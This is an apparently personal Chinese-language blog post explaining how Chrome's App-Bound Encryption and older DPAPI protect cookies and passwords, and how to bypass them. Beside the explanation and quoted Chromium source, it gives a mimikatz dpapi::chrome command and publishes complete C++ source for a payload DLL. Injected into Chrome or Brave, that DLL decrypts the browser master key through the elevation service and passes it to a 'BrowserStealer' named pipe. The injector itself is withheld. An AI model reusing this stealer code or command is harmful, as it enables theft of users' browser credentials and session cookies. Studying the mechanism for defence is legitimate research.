---
title: "淺讀 Chrome Elevator: 如何繞過 Chrome App-Bound Encryption 來竊取資料"
date: 2026-01-26
tags:
  - security
keywords:
  - Chrome Elevator
  - App-Bound Encryption
  - 資料竊取
  - 資訊安全
  - 加密技術
  - 瀏覽器安全
  - 漏洞利用
  - 資安研究
  - 安全漏洞
  - 資安防護
  - 資訊保護
  - 網路安全
  - DLL Injection
  - Reflective DLL Injection
  - Process Hollowing
  - Code Injection
  - Cookie Theft
  - Credential Stealing
  - Infostealer
  - Malware Analysis
  - Elevation of Privilege
  - Bypass Techniques
  - Windows Security
  - DPAPI
  - Cryptography
  - Reverse Engineering
  - Red Teaming
  - Threat Hunting
  - Endpoint Security
  - EDR Evasion
  - System Service
  - IPC Mechanism
---

最近剛推完研究所閒閒沒事，所以來玩一點黑黑的東西。有看到許多 Discord 帳號被盜的新聞，讓我思考如果今天換我是駭客，我要怎麼像他們一樣偷到 Discord 的 Cookie？

於是我寫了一個小小的惡意程式，在這篇文章我將紀錄一下取得 Chrome 或 Brave 這種常見瀏覽器的敏感資料的原理以及繞過。

【此文純屬技術研究學習，請勿用於非法用途】

## 舊版本的 Solution: DPAPI

DPAPI 是 Windows 提供給應用程式用來加密資料的 API，舊版的瀏覽器會使用 DPAPI 來加密儲存在本地端的 Cookie 或是密碼等敏感資料。而 DPAPI 的特性是只要是同一個使用者帳號下的程式都可以解密這些資料，因此駭客只要取得使用者的權限，就能夠輕易地解密這些敏感資料。

DPAPI 的路徑通常位於：

- `%APPDATA%\Microsoft\Protect\<User SID>\`

裡面會存著稱為 Master Key 的東西，他是由 Windows 生成的，並且需要使用登入密碼/Kerberos key 來解密。

駭客可以使用 mimikatz 的 dpapi 模組來解密這些資料，例如：

```bash
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /encryptionkey:[Encrypted Key] /unprotect
```

流程：

1. 用 DPAPI 解開 Local State 裡的加密金鑰
2. 用解開的金鑰去解密 Login Data 裡的密碼

## 新版本的 Solution: App-Bound Encryption

為了防堵 DPAPI 被濫用，Chrome 在新版中引入了 App-Bound Encryption 機制。

簡單說就是認使用者以外還必須認程式。只有 Elevation Service 這個系統服務能夠解密這些資料，其他程式即使取得使用者權限也無法解密。

相關研究可以參考

[Chrome-App-Bound-Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/tree/main/docs)
[Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)

他的目的不是阻止駭客取得更高權限或能夠對 Chrome 注入程式碼，已知對 Chrome 注入程式碼可以繞過這個機制。

### 底層機制

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpjkAClX2VvgsIhLi2zAmvRwVMPEeJqUhqisKHIKxbfGAwh8p8-V7Ixct5azzn_jYfJYo2izWnGcbkVh3cabbCLVQQQsJAJagvFPCFJsx4MibauJqnLVymQYdhdGGc53q3wSJSeTPQ6vyxXosJ-tJRKuaaoV7_J_E2KB9glSZ1m3NSEwEBj-duevgROHlM/s1416/Screenshot%202024-07-26%202.15.06%20PM.png)

引用原始文章的圖， Elevation Service 會以 SYSTEM 權限執行，並且監聽來自 Chrome 的 IPC 請求，當 Chrome 要求解密資料時，Elevation Service 會驗證請求的來源是否為 Chrome，如果是的話就會進行解密並回傳給 Chrome。

### 金鑰管理與函式呼叫

- `app_bound_key`：32-byte Session Key，繞過 Elevation Service 解密資料的關鍵

當 Chrome 需要使用 ABE 加密時，會呼叫 `IElevator::EncryptData` 的 COM Method(註：COM 是微軟提出用於不同軟體之間溝通的介面)。

附上原始碼片段：

```cpp
// https://github.com/chromium/chromium/blob/main/chrome/elevation_service/elevator.cc

// include headers...

namespace elevation_service {

  // ...

  // 加密資料
  HRESULT Elevator::EncryptData(ProtectionLevel protection_level,
                              const BSTR plaintext,
                              BSTR* ciphertext,
                              DWORD* last_error) {
  EncryptFlags flags;
  protection_level = RemoveFlags(protection_level, flags);

  if (protection_level >= ProtectionLevel::PROTECTION_MAX) {
    return kErrorUnsupportedProtectionLevel;
  }

  // 取得明文長度
  UINT length = ::SysStringByteLen(plaintext);

  if (!length)
    return E_INVALIDARG;

  std::string plaintext_str(reinterpret_cast<char*>(plaintext), length);
  #if BUILDFLAG(GOOGLE_CHROME_BRANDING)
    InternalFlags pre_process_flags;
    auto pre_process_result = PreProcessData(plaintext_str, &pre_process_flags);
    if (!pre_process_result.has_value()) {
      return pre_process_result.error();
    }
    plaintext_str.swap(*pre_process_result);
  #endif  // BUILDFLAG(GOOGLE_CHROME_BRANDING)

    DATA_BLOB intermediate = {};
    // 使用模擬的使用者權限 DPAPI 加密
    if (ScopedClientImpersonation impersonate; impersonate.is_valid()) {
      const auto calling_process = GetCallingProcess();
      if (!calling_process.IsValid())
        return kErrorCouldNotObtainCallingProcess;

      // 產生驗證資料
      const auto validation_data =
          GenerateValidationData(protection_level, calling_process);
      if (!validation_data.has_value()) {
        return validation_data.error();
      }
      const auto data =
          std::string(validation_data->cbegin(), validation_data->cend());

      // 將驗證資料與明文資料組合在一起
      std::string data_to_encrypt;
      AppendStringWithLength(data, data_to_encrypt);
      AppendStringWithLength(plaintext_str, data_to_encrypt);

      DATA_BLOB input = {};
      input.cbData = base::checked_cast<DWORD>(data_to_encrypt.length());
      input.pbData = const_cast<BYTE*>(
          reinterpret_cast<const BYTE*>(data_to_encrypt.data()));

      // 使用使用者權限加密
      if (!::CryptProtectData(
              &input, /*szDataDescr=*/
              base::SysUTF8ToWide(base::StrCat({version_info::GetProductName(),
                                                version_info::IsOfficialBuild()
                                                    ? ""
                                                    : " (Developer Build)"}))
                  .c_str(),
              nullptr, nullptr, nullptr, /*dwFlags=*/CRYPTPROTECT_AUDIT,
              &intermediate)) {
        *last_error = ::GetLastError();
        return kErrorCouldNotEncryptWithUserContext;
      }
    } else {
      return impersonate.result();
    }
    DATA_BLOB output = {};
    {
      base::win::ScopedLocalAlloc intermediate_freer(intermediate.pbData);

      // 使用 SYSTEM 權限加密
      if (!::CryptProtectData(
              &intermediate,
              /*szDataDescr=*/
              base::SysUTF8ToWide(version_info::GetProductName()).c_str(),
              nullptr, nullptr, nullptr, /*dwFlags=*/CRYPTPROTECT_AUDIT,
              &output)) {
        *last_error = ::GetLastError();
        return kErrorCouldNotEncryptWithSystemContext;
      }
    }
    base::win::ScopedLocalAlloc output_freer(output.pbData);

    *ciphertext = ::SysAllocStringByteLen(reinterpret_cast<LPCSTR>(output.pbData),
                                          output.cbData);

    if (!*ciphertext)
      return E_OUTOFMEMORY;

    return S_OK;
  }

  HRESULT Elevator::DecryptData(const BSTR ciphertext,
                                BSTR* plaintext,
                                DWORD* last_error) {
    UINT length = ::SysStringByteLen(ciphertext);

    if (!length)
      return E_INVALIDARG;

    DATA_BLOB input = {};
    input.cbData = length;
    input.pbData = reinterpret_cast<BYTE*>(ciphertext);

    DATA_BLOB intermediate = {};

    // Decrypt using the SYSTEM dpapi store.
    if (!::CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0,
                              &intermediate)) {
      *last_error = ::GetLastError();
      return kErrorCouldNotDecryptWithSystemContext;
    }

    base::win::ScopedLocalAlloc intermediate_freer(intermediate.pbData);

    std::string plaintext_str;
    if (ScopedClientImpersonation impersonate; impersonate.is_valid()) {
      DATA_BLOB output = {};
      // Decrypt using the user store.
      if (!::CryptUnprotectData(&intermediate, nullptr, nullptr, nullptr, nullptr,
                                0, &output)) {
        *last_error = ::GetLastError();
        return kErrorCouldNotDecryptWithUserContext;
      }
      base::win::ScopedLocalAlloc output_freer(output.pbData);

      std::string mutable_plaintext(reinterpret_cast<char*>(output.pbData),
                                    output.cbData);

      const std::string validation_data = PopFromStringFront(mutable_plaintext);
      if (validation_data.empty()) {
        return kErrorInvalidValidationData;
      }
      const auto data =
          std::vector<uint8_t>(validation_data.cbegin(), validation_data.cend());
      const auto process = GetCallingProcess();
      if (!process.IsValid()) {
        *last_error = ::GetLastError();
        return kErrorCouldNotObtainCallingProcess;
      }

      // Note: Validation should always be done using caller impersonation token.
      HRESULT validation_result = ValidateData(process, data);

      if (FAILED(validation_result)) {
        *last_error = ::GetLastError();
        return validation_result;
      }
      plaintext_str = PopFromStringFront(mutable_plaintext);
    } else {
      return impersonate.result();
    }
    bool should_reencrypt = false;
  #if BUILDFLAG(GOOGLE_CHROME_BRANDING)
    InternalFlags flags;
    auto post_process_result = PostProcessData(plaintext_str, &flags);
    if (!post_process_result.has_value()) {
      return post_process_result.error();
    }
    plaintext_str.swap(*post_process_result);
    if (flags.post_process_should_reencrypt) {
      should_reencrypt = true;
    }
  #endif  // BUILDFLAG(GOOGLE_CHROME_BRANDING)

    *plaintext =
        ::SysAllocStringByteLen(plaintext_str.c_str(), plaintext_str.length());

    if (!*plaintext)
      return E_OUTOFMEMORY;

    if (base::CommandLine::ForCurrentProcess()->HasSwitch(
            switches::kFakeReencryptForTestingSwitch)) {
      should_reencrypt = true;
    }
    return should_reencrypt ? kSuccessShouldReencrypt : S_OK;
  }
  // ...
}  // namespace elevation_service
```

所以加密的過程會是：明文 -> 明文+驗證資料 -> 使用者權限 DPAPI 加密 -> SYSTEM 權限 DPAPI 加密 -> 密文

而解密的過程則是：密文 -> SYSTEM 權限 DPAPI 解密 -> 使用者權限 DPAPI 解密 -> 驗證資料檢查 -> 明文

## IElevator2

IElevator 是在 Chrome 127 版本引入的，而 IElevator2 則是在 Chrome 144 版本引入的，IElevator2 從 6 個介面擴展到 12 個介面，增加了兩個新的方法 `RunIsolatedChrome` 和 `AcceptInvitation`。

而原本的方法用法不變，符合 COM 的向下相容性。

新版本可能會將 COM 遷移到 Mojo，也就是換一種 IPC 機制。但因為 ABE 核心架構一樣所以對於 ABE 的繞過方法應該不會有太大影響。

### PoC

以下是一個簡單的 Payload DLL，可以用來繞過 ABE 來取得 Chrome 或 Brave 的 Master Key。

但不包含也不會公開注入程式碼、解開密碼的功能(太刑了)。

IElevator.h:

```cpp
#pragma once
#include <ole2.h>
#include <windows.h>

// Google Chrome Elevation Service CLSID
// {708860E0-F641-4611-8895-7D867DD3675B}
static const CLSID CLSID_GoogleChromeElevationService = {
    0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};

// Brave Elevation Service CLSID (Stable)
// {576B31AF-6369-4B6B-8560-E4B203A97A8B}
static const CLSID CLSID_BraveElevationService = {
    0x576b31af, 0x6369, 0x4b6b, {0x85, 0x60, 0xe4, 0xb2, 0x03, 0xa9, 0x7a, 0x8b}};

// IElevator IID (Chrome / Default)
// {463ABECF-410D-407F-8AF5-0DF35A005CC8} -- Updated from browser_config.hpp
static const IID IID_IElevator = {
    0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};

// IElevator IID (Brave / Chromium variant) -> Brave uses Chrome's IID actually
// {F396861E-0C8E-4C71-8256-2FAE6D759CE9}
static const IID IID_IElevatorBrave = {
    0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}};

// IElevator2Chrome IID (Chrome Stable)
// {1BF5208B-295F-4992-B5F4-3A9BB6494838}
static const IID IID_IElevator2Chrome = {
    0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

// IElevator2 IID (Brave / Chromium variant) - Reuses Chrome V2 IID
// {1BF5208B-295F-4992-B5F4-3A9BB6494838}
static const IID IID_IElevator2Brave = {
    0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

// IElevatorChromium IID
// {3218DA17-49C2-479A-8290-311DBFB86490}
static const IID IID_IElevatorChromium = {
    0x3218DA17, 0x49C2, 0x479A, {0x82, 0x90, 0x31, 0x1D, 0xBF, 0xB8, 0x64, 0x90}};

enum ProtectionLevel {
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
};

class IElevator : public IUnknown {
   public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR* crx_path,
                                                             const WCHAR* browser_appid,
                                                             const WCHAR* browser_version,
                                                             const WCHAR* session_id, DWORD caller_proc_id,
                                                             ULONG_PTR* proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel protection_level, const BSTR plaintext,
                                                  BSTR* ciphertext, DWORD* last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR ciphertext, BSTR* plaintext,
                                                  DWORD* last_error) = 0;
};

class IElevator2 : public IUnknown {
   public:
    // --- IElevator Methods (duplicated vtable layout) ---
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR* crx_path,
                                                             const WCHAR* browser_appid,
                                                             const WCHAR* browser_version,
                                                             const WCHAR* session_id, DWORD caller_proc_id,
                                                             ULONG_PTR* proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel protection_level, const BSTR plaintext,
                                                  BSTR* ciphertext, DWORD* last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR ciphertext, BSTR* plaintext,
                                                  DWORD* last_error) = 0;

    // --- IElevator2 Methods ---
    virtual HRESULT STDMETHODCALLTYPE RunIsolatedChrome(DWORD flags, const WCHAR* command_line, BSTR* log,
                                                        ULONG_PTR* proc_handle, DWORD* last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE AcceptInvitation(const WCHAR* server_name) = 0;
};
```

main.cpp:

```cpp
// Payload DLL for extracting Chrome/Brave Master Key
// Supports both App-Bound Encryption (ABE) and legacy DPAPI

#include <shlobj.h>
#include <windows.h>

#include "IElevator.h"

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

// --- Typedefs for Dynamic Loading ---
typedef HRESULT(WINAPI* Proto_CoInitialize)(LPVOID pvReserved);
typedef void(WINAPI* Proto_CoUninitialize)(void);
typedef HRESULT(WINAPI* Proto_CoCreateInstance)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext,
                                                REFIID riid, LPVOID* ppv);
typedef HRESULT(WINAPI* Proto_CLSIDFromString)(LPCOLESTR lpsz, LPCLSID pclsid);
typedef HRESULT(WINAPI* Proto_CoSetProxyBlanket)(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc,
                                                 OLECHAR* pServerPrincName, DWORD dwAuthnLevel,
                                                 DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
                                                 DWORD dwCapabilities);
typedef BSTR(WINAPI* Proto_SysAllocStringByteLen)(LPCSTR psz, UINT len);
typedef void(WINAPI* Proto_SysFreeString)(BSTR bstrString);
typedef UINT(WINAPI* Proto_SysStringByteLen)(BSTR bstr);
typedef BOOL(WINAPI* Proto_CryptStringToBinaryA)(LPCSTR pszString, DWORD cchString, DWORD dwFlags,
                                                 BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip,
                                                 DWORD* pdwFlags);
typedef BOOL(WINAPI* Proto_CryptUnprotectData)(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr,
                                               DATA_BLOB* pOptionalEntropy, PVOID pvReserved,
                                               CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags,
                                               DATA_BLOB* pDataOut);
typedef LSTATUS(WINAPI* Proto_RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired,
                                             PHKEY phkResult);
typedef LSTATUS(WINAPI* Proto_RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved,
                                                LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef LSTATUS(WINAPI* Proto_RegCloseKey)(HKEY hKey);
typedef DWORD(WINAPI* Proto_GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef DWORD(WINAPI* Proto_ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
typedef DWORD(WINAPI* Proto_GetFileAttributesA)(LPCSTR lpFileName);

struct ComApi {
    Proto_CoInitialize pCoInitialize;
    Proto_CoUninitialize pCoUninitialize;
    Proto_CoCreateInstance pCoCreateInstance;
    Proto_CLSIDFromString pCLSIDFromString;
    Proto_CoSetProxyBlanket pCoSetProxyBlanket;
    Proto_SysAllocStringByteLen pSysAllocStringByteLen;
    Proto_SysFreeString pSysFreeString;
    Proto_SysStringByteLen pSysStringByteLen;
    Proto_CryptStringToBinaryA pCryptStringToBinaryA;
    Proto_CryptUnprotectData pCryptUnprotectData;
    Proto_RegOpenKeyExA pRegOpenKeyExA;
    Proto_RegQueryValueExA pRegQueryValueExA;
    Proto_RegCloseKey pRegCloseKey;
    Proto_GetModuleFileNameA pGetModuleFileNameA;
    Proto_ExpandEnvironmentStringsA pExpandEnvironmentStringsA;
    Proto_GetFileAttributesA pGetFileAttributesA;

    HMODULE hOle32;
    HMODULE hOleAut32;
    HMODULE hCrypt32;
    HMODULE hAdvapi32;
    HMODULE hKernel32;
};

HMODULE g_hModule = NULL;

// Helper functions
void* my_memcpy(void* dest, const void* src, size_t count) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (count--) *d++ = *s++;
    return dest;
}

int my_strlen(const char* str) {
    int len = 0;
    while (str[len]) len++;
    return len;
}

char* my_strstr(const char* haystack, const char* needle) {
    if (!*needle) return (char*)haystack;
    for (; *haystack; haystack++) {
        const char* h = haystack;
        const char* n = needle;
        while (*h && *n && *h == *n) {
            h++;
            n++;
        }
        if (!*n) return (char*)haystack;
    }
    return NULL;
}

#pragma function(memset)
void* __cdecl memset(void* dest, int c, size_t count) {
    char* bytes = (char*)dest;
    while (count--) {
        *bytes++ = (char)c;
    }
    return dest;
}

BOOL InitComApi(ComApi* api) {
    api->hOle32 = LoadLibraryA("ole32.dll");
    api->hOleAut32 = LoadLibraryA("oleaut32.dll");
    api->hCrypt32 = LoadLibraryA("crypt32.dll");
    api->hAdvapi32 = LoadLibraryA("advapi32.dll");
    api->hKernel32 = LoadLibraryA("kernel32.dll");

    if (!api->hOle32 || !api->hOleAut32 || !api->hCrypt32 || !api->hAdvapi32 || !api->hKernel32) return FALSE;

    api->pCoInitialize = (Proto_CoInitialize)GetProcAddress(api->hOle32, "CoInitialize");
    api->pCoUninitialize = (Proto_CoUninitialize)GetProcAddress(api->hOle32, "CoUninitialize");
    api->pCoCreateInstance = (Proto_CoCreateInstance)GetProcAddress(api->hOle32, "CoCreateInstance");
    api->pCLSIDFromString = (Proto_CLSIDFromString)GetProcAddress(api->hOle32, "CLSIDFromString");
    api->pCoSetProxyBlanket = (Proto_CoSetProxyBlanket)GetProcAddress(api->hOle32, "CoSetProxyBlanket");
    api->pSysAllocStringByteLen =
        (Proto_SysAllocStringByteLen)GetProcAddress(api->hOleAut32, "SysAllocStringByteLen");
    api->pSysFreeString = (Proto_SysFreeString)GetProcAddress(api->hOleAut32, "SysFreeString");
    api->pSysStringByteLen = (Proto_SysStringByteLen)GetProcAddress(api->hOleAut32, "SysStringByteLen");
    api->pCryptStringToBinaryA =
        (Proto_CryptStringToBinaryA)GetProcAddress(api->hCrypt32, "CryptStringToBinaryA");
    api->pCryptUnprotectData = (Proto_CryptUnprotectData)GetProcAddress(api->hCrypt32, "CryptUnprotectData");
    api->pRegOpenKeyExA = (Proto_RegOpenKeyExA)GetProcAddress(api->hAdvapi32, "RegOpenKeyExA");
    api->pRegQueryValueExA = (Proto_RegQueryValueExA)GetProcAddress(api->hAdvapi32, "RegQueryValueExA");
    api->pRegCloseKey = (Proto_RegCloseKey)GetProcAddress(api->hAdvapi32, "RegCloseKey");
    api->pGetModuleFileNameA = (Proto_GetModuleFileNameA)GetProcAddress(api->hKernel32, "GetModuleFileNameA");
    api->pExpandEnvironmentStringsA =
        (Proto_ExpandEnvironmentStringsA)GetProcAddress(api->hKernel32, "ExpandEnvironmentStringsA");
    api->pGetFileAttributesA = (Proto_GetFileAttributesA)GetProcAddress(api->hKernel32, "GetFileAttributesA");

    return (api->pCoInitialize && api->pCoUninitialize && api->pCoCreateInstance && api->pCLSIDFromString &&
            api->pSysAllocStringByteLen && api->pSysFreeString && api->pCryptStringToBinaryA &&
            api->pCryptUnprotectData && api->pRegOpenKeyExA && api->pCoSetProxyBlanket &&
            api->pGetModuleFileNameA && api->pExpandEnvironmentStringsA && api->pGetFileAttributesA);
}

BOOL Base64Decode(ComApi* api, const char* input, BYTE** output, DWORD* outLen) {
    if (!api->pCryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, outLen, NULL, NULL)) return FALSE;
    *output = (BYTE*)LocalAlloc(LPTR, *outLen);
    return api->pCryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, outLen, NULL, NULL);
}

void LogToPipe(HANDLE hPipe, const char* data) {
    if (hPipe != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hPipe, data, my_strlen(data), &bytesWritten, NULL);
        FlushFileBuffers(hPipe);
    }
}

void WriteKeyToPipe(HANDLE hPipe, const BYTE* keyData, DWORD keyLen) {
    // Build full message in buffer
    char buffer[4 + 64 * 2 + 2]; // "KEY:" + hex(32 bytes) + "\n"
    buffer[0] = 'K';
    buffer[1] = 'E';
    buffer[2] = 'Y';
    buffer[3] = ':';

    const char* hex = "0123456789ABCDEF";
    for (DWORD i = 0; i < keyLen; i++) {
        buffer[4 + i * 2] = hex[(keyData[i] >> 4) & 0xF];
        buffer[4 + i * 2 + 1] = hex[keyData[i] & 0xF];
    }
    buffer[4 + keyLen * 2] = '\n';

    DWORD totalLen = 4 + keyLen * 2 + 1;
    DWORD written;
    WriteFile(hPipe, buffer, totalLen, &written, NULL);
    FlushFileBuffers(hPipe);
}

void PayloadWorker() {
    HANDLE hPipe = CreateFileA("\\\\.\\pipe\\BrowserStealer", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        return;
    }

    ComApi api = {0};
    if (!InitComApi(&api)) {
        CloseHandle(hPipe);
        return;
    }

    HRESULT hr = api.pCoInitialize(NULL);
    if (FAILED(hr)) {
        CloseHandle(hPipe);
        return;
    }

    // Detect browser type
    char procPath[MAX_PATH] = {0};
    api.pGetModuleFileNameA(NULL, procPath, MAX_PATH);

    BOOL isBrave = (my_strstr(procPath, "brave.exe") || my_strstr(procPath, "BRAVE.EXE"));

    // Determine Local State path
    char localStatePath[MAX_PATH];
    BOOL foundFile = FALSE;

    if (isBrave) {
        api.pExpandEnvironmentStringsA("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                                       localStatePath, MAX_PATH);
    } else {
        api.pExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
                                       localStatePath, MAX_PATH);
    }

    if (api.pGetFileAttributesA(localStatePath) != INVALID_FILE_ATTRIBUTES) {
        foundFile = TRUE;
    }

    if (!foundFile) {
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    // Read Local State file
    HANDLE hFile = CreateFileA(localStatePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    char* buffer = (char*)LocalAlloc(LPTR, fileSize + 1);
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Try to find ABE key first
    BOOL useABE = FALSE;
    const char* keyPattern = "\"app_bound_encrypted_key\"";
    char* pos = my_strstr(buffer, keyPattern);

    if (pos) {
        useABE = TRUE;
    } else {
        // Fallback to DPAPI
        keyPattern = "\"encrypted_key\"";
        pos = my_strstr(buffer, keyPattern);
    }

    if (!pos) {
        LocalFree(buffer);
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    // Extract base64 key
    pos += my_strlen(keyPattern);
    while (*pos && (*pos == ' ' || *pos == ':' || *pos == '\"')) pos++;

    char* end = pos;
    while (*end && *end != '\"') end++;

    int b64Len = (int)(end - pos);
    char* b64Key = (char*)LocalAlloc(LPTR, b64Len + 1);
    my_memcpy(b64Key, pos, b64Len);
    b64Key[b64Len] = 0;
    LocalFree(buffer);

    // Decode base64
    BYTE* rawKey = NULL;
    DWORD rawKeyLen = 0;
    if (!Base64Decode(&api, b64Key, &rawKey, &rawKeyLen)) {
        LocalFree(b64Key);
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }
    LocalFree(b64Key);

    if (!useABE) {
        // DPAPI decryption
        if (rawKeyLen > 5 && rawKey[0] == 'D' && rawKey[1] == 'P' && rawKey[2] == 'A' && rawKey[3] == 'P' &&
            rawKey[4] == 'I') {
            DATA_BLOB in;
            in.pbData = rawKey + 5;
            in.cbData = rawKeyLen - 5;
            DATA_BLOB out;

            if (api.pCryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                WriteKeyToPipe(hPipe, out.pbData, out.cbData);
                LocalFree(out.pbData);
            }
        }

        LocalFree(rawKey);
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    // ABE decryption via COM Elevator
    CLSID targetCLSID;
    const WCHAR* szClsidBrave = L"{576B31AF-6369-4B6B-8560-E4B203A97A8B}";
    const WCHAR* szClsidChrome = L"{708860E0-F641-4611-8895-7D867DD3675B}";

    if (isBrave) {
        hr = api.pCLSIDFromString(szClsidBrave, &targetCLSID);
    } else {
        hr = api.pCLSIDFromString(szClsidChrome, &targetCLSID);
    }

    if (FAILED(hr)) {
        LocalFree(rawKey);
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    // Try IElevator2 first (newer interface)
    IElevator2* pElevator2 = NULL;
    IElevator* pElevator = NULL;

    if (isBrave) {
        hr = api.pCoCreateInstance(targetCLSID, NULL, CLSCTX_LOCAL_SERVER, IID_IElevator2Brave,
                                   (void**)&pElevator2);
        if (FAILED(hr)) {
            hr = api.pCoCreateInstance(targetCLSID, NULL, CLSCTX_LOCAL_SERVER, IID_IElevatorBrave,
                                       (void**)&pElevator);
        }
    } else {
        hr = api.pCoCreateInstance(targetCLSID, NULL, CLSCTX_LOCAL_SERVER, IID_IElevator2Chrome,
                                   (void**)&pElevator2);
        if (FAILED(hr)) {
            hr = api.pCoCreateInstance(targetCLSID, NULL, CLSCTX_LOCAL_SERVER, IID_IElevator,
                                       (void**)&pElevator);
        }
    }

    if (FAILED(hr)) {
        LocalFree(rawKey);
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    // Set proxy blanket
    IUnknown* pProxy = (pElevator2) ? (IUnknown*)pElevator2 : (IUnknown*)pElevator;
    api.pCoSetProxyBlanket(pProxy, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
                           RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL,
                           EOAC_DYNAMIC_CLOAKING);

    // Skip version prefix (app_bound_encrypted_key has 4-byte prefix, not just "v10")
    // Reference: Chrome uses DWORD (4 bytes) version prefix
    DWORD offset = 0;
    if (rawKeyLen > 4) {
        offset = 4;
    }

    if (rawKeyLen <= offset) {
        if (pElevator2) pElevator2->Release();
        if (pElevator) pElevator->Release();
        LocalFree(rawKey);
        api.pCoUninitialize();
        CloseHandle(hPipe);
        return;
    }

    BSTR input = api.pSysAllocStringByteLen((LPCSTR)(rawKey + offset), rawKeyLen - offset);
    BSTR output = NULL;
    DWORD lastError = 0;

    if (pElevator2) {
        hr = pElevator2->DecryptData(input, &output, &lastError);
    } else {
        hr = pElevator->DecryptData(input, &output, &lastError);
    }

    api.pSysFreeString(input);

    if (SUCCEEDED(hr)) {
        UINT len = api.pSysStringByteLen(output);

        if (len > 0 && output != NULL) {
            WriteKeyToPipe(hPipe, (BYTE*)output, len);
        }

        if (output) {
            api.pSysFreeString(output);
        }
    }

    // Release COM objects
    if (pElevator2) pElevator2->Release();
    if (pElevator) pElevator->Release();

    LocalFree(rawKey);
    api.pCoUninitialize();
    CloseHandle(hPipe);
}

extern "C" void __stdcall PayloadEntry() {
    PayloadWorker();
    if (g_hModule) {
        FreeLibraryAndExitThread(g_hModule, 0);
    } else {
        ExitThread(0);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hModule = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadEntry, NULL, 0, NULL);
    }
    return TRUE;
}
```

## References

- [Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Mimikatz DPAPI module](https://github.com/gentilkiwi/mimikatz/wiki/Dpapi)
- [Chromium Elevation Service Source Code](https://github.com/chromium/chromium/blob/main/chrome/elevation_service/elevator.cc)
